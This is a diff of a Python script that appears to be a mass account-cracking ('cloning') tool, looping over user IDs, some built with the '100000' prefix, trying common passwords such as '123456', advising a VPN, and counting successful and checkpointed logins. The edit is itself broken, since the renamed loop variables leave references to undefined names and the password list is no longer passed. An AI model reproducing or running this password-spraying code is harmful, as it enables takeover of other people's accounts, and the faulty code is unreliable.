@@ -371,10 +371,10 @@ def __2010___2011():
         print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[0;97m TOTAL IDS : \033[92m{tl}")
         print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[0;97m USE 1.1.1.1 VPN FOR BEST RESULT")
         linex()
-        for mal in user:
+        for uid in user:
             uid = mal
             pas = ['123456', '1234567', '12345678', '123456789']
-            Shani.submit(____old____, uid, pas, tl)
+            Shani.submit(____old____, uid,total_ids)
     print('');linex();print(f"\n{green} Cloning Session Complete")
     print(f"{white}➤ Total OK: {green}{len(ok)}")
     print(f"{white}➤ Total CP: {red}{len(cp)}")
@@ -397,10 +397,10 @@ def ____old2009___():
         print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[0;97m TOTAL IDS : \033[92m{tl}")
         print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[0;97m USE 1.1.1.1 VPN FOR BEST RESULT")
         linex()
-        for love in user:
+        for uid in user:
             uid = "100000" + love
             pas = ['123456', '1234567', '12345678', '123456789']
-            Shani.submit(____old____, uid, pas, tl)
+            Shani.submit(____old____, uid,total_ids)
 
     print('');linex();print(f"\n{green} Cloning Session Complete")
     print(f"{white}➤ Total OK: {green}{len(ok)}")
